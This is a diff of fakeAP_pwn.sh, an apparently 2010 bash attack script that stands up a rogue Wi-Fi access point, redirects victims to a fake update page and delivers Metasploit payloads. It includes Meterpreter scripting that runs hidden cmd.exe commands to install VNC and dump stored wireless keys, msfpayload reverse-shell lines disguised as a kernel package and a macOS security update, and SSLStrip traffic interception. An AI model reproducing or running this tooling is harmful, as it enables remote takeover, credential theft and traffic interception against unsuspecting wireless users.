@@ -1,9 +1,17 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC18 2010-07-11)                                                         #
+# fakeAP_pwn.sh (v0.3-RC20 2010-07-11)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
+#----------------------------------------------------------------------------------------------#
+# Known issues:                                                                                #
+#   - Slowness                                                                                 #
+#        Try a different MTU value?                                                            #
+#   - No IP                                                                                    #
+#        Try...                                                                               #
+#   - Wireless N                                                                               #
+#        Doesn't work too well!                                                                #
 #----------------------------------------------------------------------------------------------#
 #ToDo List:                                                                                    #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
@@ -15,9 +23,10 @@
 # v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
 # v0.5 - Java exploit     - Different "delivery system" ;)                                     #
 # v0.6 - Linux/OSX/x64    - Make compatible                                                    #
-# v0.7 - SET              - Social Engineering Toolkit                                         #
+# v0.7 - S.E.T.           - Social Engineering Toolkit                                         #
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
 # Metasploit "fun"        - Automate a few more "things"                                       #
+# Clone AP                - Copys SSID & MAC address then kick all...                          #
 # apt-get install hostapd                                                                      #
 #----------------------------------------------------------------------------------------------#
 # Defaults *****~~~Change theses~~~*****
@@ -37,14 +46,14 @@ export        fakeAPmac=true                         # true/false - Randomize th
 export           extras=false                        # true/false - Runs extra programs after session is created
 export            debug=false                        # true/false - If you're having problems
 export          verbose=0                            # 0/1/2      - Verbose mode. Displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
-#-----------------------------------------------------------------------------------------------
+#----------------------------------------------------------------------------------------------#
 # Defaults *****~~~!Don't touch!~~~*****
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC18"
+export   version="0.3-RC20"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
-#-----------------------------------------------------------------------------------------------
+#----------------------------------------------------------------------------------------------#
 function cleanup() {
    echo
    echo -e "\e[01;32m[>]\e[00m Cleaning up..."
@@ -75,7 +84,7 @@ function cleanup() {
    exit 0
 }
 function help() {
-   echo "(C)opyright 2010 g0tmi1k & joker5bb  ~ http://g0tmi1k.blogspot.com
+   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com
 
  Usage: bash fakeAP_pwn.sh -e [ESSID] -c [channel] -i [interface] -w [interface]
              -m [interface]  -p [sbd/vnc/other] -b [/path] -s [/path] -h [/path] -t [MTU]
@@ -125,7 +134,7 @@ function update() {
    echo -e "\e[01;36m[>]\e[00m Updated!" # Now using v$version_new."
    exit 2
 }
-#-----------------------------------------------------------------------------------------------
+#----------------------------------------------------------------------------------------------#
 echo -e "\e[01;36m[*]\e[00m g0tmilk's fakeAP_pwn v$version"
 
 while getopts "e:c:i:w:m:p:b:s:h:t:nrzxdvVu?" OPTIONS; do
@@ -309,13 +318,19 @@ info = @client.sys.config.sysinfo
 os = info['OS']
 print_status(\"New session (#{os}) on #{host}:#{port}...\")
 
-if (os =~ /(Linux)/)
-	print_status(\"Coming soon...\")
+if not (os =~ /Linux/ || os =~ /OSX/ || os =~ /Windows/)
+	print_error(\"Unsupported OS\")
+	exit
 end
-if (os =~ /(OSX)/)
+if (os =~ /Linux/)
 	print_status(\"Coming soon...\")
+	#doLinux(client)
 end
-if (os =~ /(Windows)/)" > /tmp/fakeAP_pwn.rb
+if (os =~ /OSX/)
+	print_status(\"Coming soon...\")
+	#doOSX(client)
+end
+if (os =~ Windows)" > /tmp/fakeAP_pwn.rb
 if [ "$payload" == "vnc" ]; then
    echo "	print_status(\"Killing old VNC (Remote Desktop)...\")
 	session.sys.process.execute(\"cmd.exe /C taskkill /IM winvnc.exe /F\", nil, {'Hidden' => true})
@@ -407,11 +422,10 @@ elif [ "$payload" == "wkv" ]; then
 	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.txt DEL /f IF EXIST %SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
 	sleep(1)" >> /tmp/fakeAP_pwn.rb
 fi
-echo "end
-
-print_status(\"Done! (= Have you... g0tmi1k?\")
-sleep(1)" >> /tmp/fakeAP_pwn.rb
-if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rb ; fi
+echo "
+end" >> /tmp/fakeAP_pwn.rb
+if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
+if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.rb ; fi
 
 # dhcpd script
 if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
@@ -442,7 +456,7 @@ if [ "$transparent" != "true" ]; then
    if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dns; fi
 fi
 
-# virtual host
+# apache - virtual host
 if test -e /etc/apache2/sites-available/fakeAP_pwn; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
 echo "<VirtualHost *:80>
 	ServerAdmin webmaster@localhost
@@ -498,11 +512,11 @@ echo "<VirtualHost *:80>
 </VirtualHost>
 </IfModule>" > /etc/apache2/sites-available/fakeAP_pwn
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
-if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
+if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 
 #echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"; fi
-#xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"; fi
+#xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"
 #echo -e "\e[01;32m[>]\e[00m Creating exploit..(OSX)"
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin"; fi
 #xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin"
@@ -576,11 +590,7 @@ if [ "$transparent" != "true" ]; then
    sleep 7
 fi
 
-#echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..."
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
-#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
-#$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &
+#SSLStrip
 
 echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
 if [ "$verbose" == "2" ] ;
@@ -664,6 +674,10 @@ if [ "$extras" == "true" ]; then
    $xterm -geometry 75x10+10+465  -T "fakeAP_pwn v$version - Images"        -e "driftnet -i at0" &                # Images
    #if [ "$verbose" == "2" ] ; then echo "[i] Command: tcpdump -i at0 -w /tmp/fakeAP_pwn.cap"; fi
    #$xterm -geometry 100x10+650+640 -T "fakeAP_pwn v$version - tcpdump" -e "tcpdump -i at0 -w /tmp/fakeAP_pwn.cap" # Dump all trafic to a .cap file
+   #if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
+   #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+   #if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
+   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &
 fi
 
 cleanup
